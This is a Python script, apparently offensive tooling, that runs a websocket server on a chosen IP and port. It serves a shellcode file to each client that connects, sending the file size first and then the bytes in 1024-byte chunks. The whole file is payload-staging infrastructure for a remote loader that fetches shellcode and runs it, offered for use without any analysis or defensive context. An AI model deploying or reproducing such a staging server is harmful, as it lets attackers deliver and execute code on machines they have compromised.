import os
import sys
import argparse
import asyncio as aio
from time import sleep
import aiofiles as aiof
from websockets.server import serve

parser = argparse.ArgumentParser()

parser.add_argument("-i", type=str, required=True, help="ip")
parser.add_argument("-p", type=int, required=True, help="port")
parser.add_argument("-s", type=str, required=True, help="shellcode to serve")

args = parser.parse_args()

#host = sys.argv[1]
#port = sys.argv[2]
#filename = sys.argv[3]

async def send_shellcode(websocket):

    # Send size of shellcode

    filesize_b = str(os.path.getsize(args.s)).encode("UTF-8")
    filesize_int = int(filesize_b.decode())

    print("[+] Sending shellcode!")
    print(f"[+] Size: {filesize_int}\n")

    await websocket.send(filesize_b)

    # Send the shellcode

    async with aiof.open(args.s, mode="rb") as f:
        
        while filesize_int > 0:
 
            data = await f.read(1024)           
            await websocket.send(data)
            filesize_int -= 1024

    await websocket.close()

async def main():
    
    print("[+] Serving shellcode..\n")

    async with serve(send_shellcode, args.i, args.p, ping_interval=None):
        await aio.Future()

if __name__ == "__main__":
    try:
        aio.run(main())
    except KeyboardInterrupt:
        print("\nExiting..")
        exit(0)
